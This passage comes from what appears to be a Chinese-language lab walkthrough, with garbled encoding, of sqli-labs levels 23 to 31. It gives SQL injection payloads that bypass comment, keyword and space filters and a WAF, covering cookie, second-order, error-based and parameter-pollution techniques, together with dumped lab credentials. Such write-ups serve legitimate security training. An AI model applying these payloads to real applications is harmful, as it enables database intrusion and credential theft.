IiB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpLDIsMyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hID0gJ3NlY3VyaXR5JyM&#x3D;</p><p>â€œ union select group_concat(table_name),2,3 from information_schema.tables where table_schema &#x3D; â€˜securityâ€™#</p><p>Cookie: uname&#x3D; IiB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSwyLDMgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9zY2hlbWEgPSAnc2VjdXJpdHknIGFuZCB0YWJsZV9uYW1lID0gJ3VzZXJzJyM&#x3D;</p><p>â€œ union select group_concat(column_name),2,3 from information_schema.columns where table_schema &#x3D; â€˜securityâ€™ and table_name &#x3D; â€˜usersâ€™#</p><p>Cookie: uname:&#x3D; IiB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbmNhdCgiOiIsdXNlcm5hbWUscGFzc3dvcmQpKSwyLDMgZnJvbSBzZWN1cml0eS51c2VycyM&#x3D;</p><p>â€œ union select group_concat(concat(â€œ:â€,username,password)),2,3 from security.users#</p><h4 id="Less-23-è”åˆæ³¨å…¥-è¿‡æ»¤æ³¨é‡Šç¬¦"><a href="#Less-23-è”åˆæ³¨å…¥-è¿‡æ»¤æ³¨é‡Šç¬¦" class="headerlink" title="Less-23-è”åˆæ³¨å…¥-è¿‡æ»¤æ³¨é‡Šç¬¦"></a>Less-23-è”åˆæ³¨å…¥-è¿‡æ»¤æ³¨é‡Šç¬¦</h4><p>?id&#x3D;1æ­£å¸¸è¿”å›æ•°æ®</p><p>?id&#x3D;1â€™<code>**Warning**:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in **D:\CTF-Tools\phpstudy_pro\WWW\sqli-labs\Less-23\index.php** on line **38**    You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1 </code>ç¡®å®šæ˜¯å•å¼•å·å­—ç¬¦å‹</p><p>?id&#x3D;1â€™ or 1 â€“+ </p><p>?id&#x3D;1â€™ and 1&#x3D;1 â€“+</p><p>?id&#x3D;1â€™ and 1&#x3D;2 #éƒ½æ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯è¿‡æ»¤äº†æ³¨é‡Šç¬¦</p><p>?id&#x3D;33â€™ union select 1,2,3â€™ è¿”å›2ï¼Œ3</p><p>?id&#x3D;21â€™ union select 1,database(),3 and â€˜</p><p>è¿”å›æ•°æ®åº“åsecurity</p><p>?id&#x3D;99â€™ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;â€™securityâ€™ â€˜</p><p>è¿”å›ï¼šemails,referers,uagents,users</p><p>?id&#x3D;99â€™ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;â€™securityâ€™ and table_name&#x3D;â€™usersâ€™ â€˜</p><p>è¿”å›ï¼šid,username,password</p><p>?id&#x3D;99â€™ union select 1,group_concat(concat_ws(â€˜:â€™,username,password)),3 from users where â€˜1â€™ &#x3D; â€˜1</p><p>è¿”å›ï¼šDumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</p><h4 id="Less-24-äºŒæ¬¡æ³¨å…¥"><a href="#Less-24-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="Less-24-äºŒæ¬¡æ³¨å…¥"></a>Less-24-äºŒæ¬¡æ³¨å…¥</h4><p>å…ˆåˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·å’Œå¯†ç ï¼Œadminâ€™#&#x2F;123456ï¼Œä½¿ç”¨è¿™ä¸ªç”¨æˆ·ç™»å½•åï¼Œè¾“å…¥admin&#x2F;111&#x2F;111æ›´æ”¹å¯†ç ï¼Œä¿®æ”¹æˆåŠŸï¼Œä¹‹åä½¿ç”¨admin&#x2F;111ç™»å½•æˆåŠŸï¼Œå¤ºå–äº†ç”¨æˆ·admin</p><p>åŸç†ï¼š</p><p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;</code></p><p>å½“è¾“å…¥adminâ€™#æ—¶ï¼š</p><p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code></p><p>sqlè¯­å¥å°±å˜æˆäº†ï¼š</p><p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#</code></p><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦åŸå¯†ç è¿›è¡ŒéªŒè¯ï¼Œå¹¶ä¸”ç›´æ¥ä¿®æ”¹äº†å…¶ä»–ç”¨æˆ·çš„å¯†ç ã€‚è¿™å°±æ˜¯æ‰€è°“çš„ <strong>äºŒæ¬¡æ³¨å…¥</strong>ï¼Œè¿™ç§æ³¨å…¥å‘ç”Ÿåœ¨ç”¨æˆ·æäº¤çš„å€¼è¢«å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œè¿™ä¸ªå€¼å¯èƒ½è¢«è½¬ä¹‰è¿‡ã€‚å½“è¿™ä¸ªå€¼è¢«å…¶ä»–æ¨¡å—è°ƒç”¨æ—¶ï¼Œä¼šä½¿ç”¨è€Œä¸è½¬ä¹‰çš„åŸæ¥çš„æ•°æ®ï¼Œå¦‚æœè¿™ä¸ªæ•°æ®æ˜¯æ¶æ„æ³¨å…¥ï¼Œåœ¨ä¸è½¬ä¹‰çš„æƒ…å†µä¸‹å°±ä¼šç”Ÿæ•ˆã€‚</p><h4 id="Less-25-è¿‡æ»¤orã€and-åŒå†™æ³¨å…¥"><a href="#Less-25-è¿‡æ»¤orã€and-åŒå†™æ³¨å…¥" class="headerlink" title="Less-25-è¿‡æ»¤orã€and-åŒå†™æ³¨å…¥"></a>Less-25-è¿‡æ»¤orã€and-åŒå†™æ³¨å…¥</h4><p>è¿™ä¸€å…³è¿‡æ»¤äº†orå’Œand </p><p>?id&#x3D;1â€™</p><p><strong>Warning</strong>:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>D:\CTF-Tools\phpstudy_pro\WWW\sqli-labs\Less-25\index.php</strong> on line <strong>37</strong><br> You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near â€˜â€™1â€™â€™ LIMIT 0,1â€™ at line 1 </p><p>?id&#x3D;1â€</p><p>  Your Login name:Dumb<br>Your Password:Dumb </p><p>ç¡®å®šä¸ºå•å¼•å·å­—ç¬¦å‹æ³¨å…¥</p><p>å¯ä»¥ä½¿ç”¨åŒå†™æ³¨å…¥</p><p>?id&#x3D;1â€™ OorR 1 &#x3D; 1â€“+</p><p>?id&#x3D;1â€™ aadnnd 1&#x3D;1 â€“+</p><p>è¿™æ ·å°±å¯ä»¥ç»•è¿‡è¿‡æ»¤äº†</p><p>?id&#x3D;33â€™ union select 1,2,3â€™ è¿”å›2ï¼Œ3</p><p>?id&#x3D;21â€™ union select 1,database(),3 and â€˜</p><p>è¿”å›æ•°æ®åº“åsecurity</p><p>?id&#x3D;99â€™ union select 1,group_concat(table_name),3 from infoORrmation_schema.tables where table_schema&#x3D;â€™securityâ€™ â€˜</p><p>è¿”å›ï¼šemails,referers,uagents,users</p><p>?id&#x3D;99â€™ union select 1,group_concat(column_name),3 from infoORrmation_schema.columns where table_schema&#x3D;â€™securityâ€™ aANDnd table_name&#x3D;â€™usersâ€™ â€˜</p><p>è¿”å›ï¼šid,username,password</p><p>?id&#x3D;99â€™ union select 1,group_concat(concat_ws(â€˜:â€™,username,passwoORrd)),3 from users â€“ +</p><p>è¿”å›ï¼šDumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:456,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,ã€rr:ee,admin#:111111,adminâ€™#:111ã€‘ï¼ˆè¿™äº›æ˜¯Less-24å†™å…¥çš„æ–°ç”¨æˆ·åå’Œå¯†ç ï¼‰</p><h4 id="Less-25a-è¿‡æ»¤orã€and-åŒå†™æ³¨å…¥-æ•°å­—å‹"><a href="#Less-25a-è¿‡æ»¤orã€and-åŒå†™æ³¨å…¥-æ•°å­—å‹" class="headerlink" title="Less-25a-è¿‡æ»¤orã€and-åŒå†™æ³¨å…¥-æ•°å­—å‹"></a>Less-25a-è¿‡æ»¤orã€and-åŒå†™æ³¨å…¥-æ•°å­—å‹</h4><p>æ³¨å…¥ä»¥ä¸‹å†…å®¹ï¼Œä»¥ä¸‹å†…å®¹å…¨éƒ¨ç½‘é¡µéƒ½å›æ˜¾é”™è¯¯ï¼Œè¯´æ˜è¯¥ç½‘é¡µæ˜¯æ•°å­—å‹æ³¨å…¥ã€‚</p><p>?id&#x3D;1â€™â€“+<br>?id&#x3D;1â€™)â€“+<br>?id&#x3D;1â€™))â€“+<br>?id&#x3D;1â€â€“+<br>?id&#x3D;1â€)â€“+</p><p>æ³¨å…¥ï¼š?id&#x3D;1 OorR 1 &#x3D; 1â€“+è¿”å›æ­£å¸¸</p><p>?id&#x3D;-1 union select 1,2,3â€™ è¿”å›2ï¼Œ3</p><p>?id&#x3D;-1 union select 1,database(),3 and â€˜</p><p>è¿”å›æ•°æ®åº“åsecurity</p><p>?id&#x3D;-1 union select 1,group_concat(table_name),3 from infoORrmation_schema.tables where table_schema&#x3D;â€™securityâ€™ â€˜</p><p>è¿”å›ï¼šemails,referers,uagents,users</p><p>?id&#x3D;-1 union select 1,group_concat(column_name),3 from infoORrmation_schema.columns where table_schema&#x3D;â€™securityâ€™ aANDnd table_name&#x3D;â€™usersâ€™ â€˜</p><p>è¿”å›ï¼šid,username,password</p><p>?id&#x3D;-1 union select 1,group_concat(concat_ws(â€˜:â€™,username,passwoORrd)),3 from users â€“ +</p><p>è¿”å›ï¼šDumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:456,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,ã€rr:ee,admin#:111111,adminâ€™#:111ã€‘ï¼ˆè¿™äº›æ˜¯Less-24å†™å…¥çš„æ–°ç”¨æˆ·åå’Œå¯†ç ï¼‰</p><h4 id="Less-26-è¿‡æ»¤æ³¨é‡Šç¬¦å’Œç©ºæ ¼-æŠ¥é”™æ³¨å…¥"><a href="#Less-26-è¿‡æ»¤æ³¨é‡Šç¬¦å’Œç©ºæ ¼-æŠ¥é”™æ³¨å…¥" class="headerlink" title="Less-26-è¿‡æ»¤æ³¨é‡Šç¬¦å’Œç©ºæ ¼-æŠ¥é”™æ³¨å…¥"></a>Less-26-è¿‡æ»¤æ³¨é‡Šç¬¦å’Œç©ºæ ¼-æŠ¥é”™æ³¨å…¥</h4><p>è¿™ä¸€å…³è¿‡æ»¤äº†æ³¨é‡Šç¬¦å’Œç©ºæ ¼ï¼ŒåŒæ—¶orã€andä¹Ÿè¢«è¿‡æ»¤äº†</p><p>è¾“å…¥?id&#x3D;1â€™æ—¶æŠ¥é”™ï¼Œç¡®å®šå­˜åœ¨å•å¼•å·å­—ç¬¦å‹æ³¨å…¥</p><p>å¯¹äºè¢«è¿‡æ»¤çš„å­—ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–çš„å­—ç¬¦è¿›è¡Œæ›¿ä»£ï¼Œä½¿ç”¨ â€œ%a0â€ æˆ– â€œ%0bâ€ æ›¿ä»£ç©ºæ ¼ï¼Œä½¿ç”¨ â€œ||â€ æ›¿ä»£ â€œorâ€ï¼Œä½¿ç”¨ â€œ%26%26â€ æ›¿ä»£ â€œandâ€ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1<span class="hljs-string">&#x27; || 1 = 1  || &#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; || updatexml(1, concat(0x7e, (SELECT (group_concat(table_name)) FROM (infoorrmation_schema.tables) WHERE (table_schema=&#x27;</span>security<span class="hljs-string">&#x27;))) ,1) || &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;||updatexml(1,concat(1,(SELECT (group_concat(column_name)) FROM (infoorrmation_schema.columns) WHERE (table_schema=&#x27;</span>security<span class="hljs-string">&#x27; %26%26 table_name = &#x27;</span>users<span class="hljs-string">&#x27;))) ,1) || &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) ))  ,1) || &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="Less-26a-è¿‡æ»¤æ³¨é‡Šç¬¦ï¼Œç©ºæ ¼-unionæ³¨å…¥"><a href="#Less-26a-è¿‡æ»¤æ³¨é‡Šç¬¦ï¼Œç©ºæ ¼-unionæ³¨å…¥" class="headerlink" title="Less-26a-è¿‡æ»¤æ³¨é‡Šç¬¦ï¼Œç©ºæ ¼-unionæ³¨å…¥"></a>Less-26a-è¿‡æ»¤æ³¨é‡Šç¬¦ï¼Œç©ºæ ¼-unionæ³¨å…¥</h4><p>å’Œless-26è¿‡æ»¤çš„åŸºæœ¬ä¸€æ ·ï¼Œä½†è¿™ä¸€å…³æ²¡æœ‰ç»™å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œæ— æ³•ç”¨æŠ¥é”™æ³¨å…¥ã€‚æ­¤å¤„å°±éœ€è¦ä½¿ç”¨ URL ç¼–ç æ¥ä»£æ›¿ç©ºæ ¼ï¼Œç„¶åç”¨ UNION æ³¨å…¥ã€‚åˆ¤æ–­æœ‰å‡ åˆ—å¯ç”¨ï¼Œåˆ«å¿˜äº† â€œORDERâ€ ä¸­çš„ â€œorâ€ è¢«è¿‡æ»¤æ‰äº†ã€‚</p><p>?id&#x3D;1â€™</p><p>?id&#x3D;1â€™)</p><p>?id&#x3D;1â€™) || (â€˜é—­åˆæˆåŠŸ</p><p>%a0ç©ºæ ¼</p><p>%27â€˜</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)%a0OorRDER%a0BY%a03||(&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">9999</span><span class="hljs-string">&#x27;)%a0UNION%a0SELECT%a01,2,3%a0||(&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">9999</span><span class="hljs-string">&#x27;)%a0UNION%a0SELECT%a01,database(),3%a0||(&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">9999</span><span class="hljs-string">&#x27;)%a0UNION%a0SELECT%a01,group_concat(table_name),3%a0FROM%a0infoORrmation_schema.tables%a0WHERE%a0table_schema = &#x27;</span>security<span class="hljs-string">&#x27;%a0||(&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)=(&#x27;</span><span class="hljs-number">2</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">9999</span><span class="hljs-string">&#x27;)%a0UNION%a0SELECT%a01,group_concat(column_name),3%a0FROM%a0infoORrmation_schema.columns%a0WHERE%a0table_schema=&#x27;</span>security<span class="hljs-string">&#x27;%a0AandND%a0table_name=&#x27;</span>users<span class="hljs-string">&#x27;%a0||(&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)=(&#x27;</span><span class="hljs-number">2</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">9999</span><span class="hljs-string">&#x27;)%a0UNION%a0SELECT%a01,group_concat(concat_ws(&quot;:&quot;,username,passwoORrd)),3%a0FROM%a0users%a0WHERE%a0(&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="Less-27-è¿‡æ»¤unionã€select"><a href="#Less-27-è¿‡æ»¤unionã€select" class="headerlink" title="Less-27-è¿‡æ»¤unionã€select"></a>Less-27-è¿‡æ»¤unionã€select</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;%a0ORDER%a0BY%a03||&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">9999</span><span class="hljs-string">&#x27;%a0UNION%a0SELECT%a01,2,3%a0or%a0&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1111</span><span class="hljs-string">&#x27;%a0UniOn%a0SelECT%a01,2,3;%00</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=9999&#x27;</span><span class="hljs-operator">%</span>a0UNiON<span class="hljs-operator">%</span>a0SElECT<span class="hljs-operator">%</span>a01,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-operator">%</span>a0or<span class="hljs-operator">%</span>a0<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=9999&#x27;</span><span class="hljs-operator">%</span>a0UNiON<span class="hljs-operator">%</span>a0SELeCT<span class="hljs-operator">%</span>a01,database(),<span class="hljs-number">3</span><span class="hljs-operator">%</span>a0or<span class="hljs-operator">%</span>a0<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=9999&#x27;</span><span class="hljs-operator">%</span>a0UNiON<span class="hljs-operator">%</span>a0SELeCT<span class="hljs-operator">%</span>a01,group_concat(table_name),<span class="hljs-number">3</span><span class="hljs-operator">%</span>a0FROM<span class="hljs-operator">%</span>a0information_schema.tables<span class="hljs-operator">%</span>a0WHERE<span class="hljs-operator">%</span>a0table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-operator">%</span>a0or<span class="hljs-operator">%</span>a0<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;2</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h4 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h4><h4 id="Less-29-HPP-â€˜"><a href="#Less-29-HPP-â€˜" class="headerlink" title="Less-29-HPP-â€˜"></a>Less-29-HPP-â€˜</h4><p>**WAF (Web åº”ç”¨é˜²æŠ¤ç³»ç»Ÿ)**æ˜¯é€šè¿‡æ‰§è¡Œä¸€ç³»åˆ—é’ˆå¯¹ HTTP&#x2F;HTTPS çš„å®‰å…¨ç­–ç•¥æ¥ä¸“é—¨ä¸º Web åº”ç”¨æä¾›ä¿æŠ¤çš„ä¸€æ¬¾äº§å“ã€‚æ­¤å¤„åº”è¯¥æ˜¯å¯¹æ³¨å…¥çš„å‚æ•°è¿›è¡Œäº†å¼ºæ•ˆè¿‡æ»¤ï¼Œä»¥æ­¤è¾¾åˆ°äº† WAF çš„ä½œç”¨ã€‚</p><p>ç»•è¿‡çš„æ–¹æ³•æ˜¯ <strong>HPP (HTTP Parameter Pollution)</strong>ï¼Œä¹Ÿå°±æ˜¯ HTTP å‚æ•°æ±¡æŸ“ã€‚æˆ‘ä»¬æ³¨å…¥ä¸¤ä¸ªåŒåçš„å‚æ•° idï¼Œç¬¬ä¸€ä¸ªå‚æ•°ç”¨äºç»•è¿‡ WAFï¼Œç¬¬äºŒä¸ªå‚æ•°ç”¨äºæ³¨å…¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=2<br></code></pre></td></tr></table></figure><p>è¿™ç§æ”»å‡»æˆåŠŸç»•è¿‡äº† WAFï¼Œå¯¹ç¬¬äºŒä¸ªå‚æ•°ç”¨å•å¼•å·é—­åˆå¹¶æ³¨é‡Šæ‰åé¢çš„å†…å®¹ã€‚ç½‘é¡µå›æ˜¾æ­£å¸¸çš„å‚æ•°ï¼Œè¯´æ˜ç½‘é¡µå­˜åœ¨å•å¼•å·é—­åˆçš„å­—ç¬¦å‹æ³¨å…¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=2<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>è·å–æ•°æ®åº“ä¿¡æ¯</p><p>ä½¿ç”¨å‚æ•°æ±¡æŸ“åï¼Œæ³¨å…¥æµç¨‹å’Œ Less 1 ä¸€æ ·ã€‚åˆ¤æ–­è¡¨æœ‰å‡ åˆ—ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; ORDER BY 3--+</span><br></code></pre></td></tr></table></figure><p>åˆ¤æ–­å“ªäº›åˆ—å¯ç”¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; UNION SELECT 1,2,3--+</span><br></code></pre></td></tr></table></figure><p>çˆ†æ•°æ®åº“åã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; UNION SELECT 1,database(),3 --+</span><br></code></pre></td></tr></table></figure><p>çˆ†è¡¨åã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=&#x27;</span>security<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>çˆ†å­—æ®µåã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=&#x27;</span>security<span class="hljs-string">&#x27; and table_name=&#x27;</span><span class="hljs-built_in">users</span><span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>çˆ†å‡º users è¡¨ä¸­çš„ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1&amp;<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; UNION SELECT 1,group_concat(concat_ws(&#x27;</span>:<span class="hljs-string">&#x27;,username,password)),3 FROM security.users--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-30-HPP-â€œ"><a href="#Less-30-HPP-â€œ" class="headerlink" title="Less-30-HPP-â€œ"></a>Less-30-HPP-â€œ</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; ORDER BY 3--+<br><br>?id=1&amp;id=-1&quot; <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot; UNION SELECT 1,database(),3 --+<br><br>?id=1&amp;id=-1&quot; <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot; union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+<br><br>?id=1&amp;id=-1&quot; <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,username,password)),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> security.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-31-HPP-â€œ"><a href="#Less-31-HPP-â€œ" class="headerlink" title="Less-31-HPP-â€œ)"></a>Less-31-HPP-â€œ)</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) ORDER BY 3--+<br><br>?id=1&amp;id=-1&quot;) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) UNION SELECT 1,database(),3 --+<br><br>?id=1&amp;id=-1&quot;) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">--+</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+<br><br>?id=1&amp;id=-1&quot;) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span 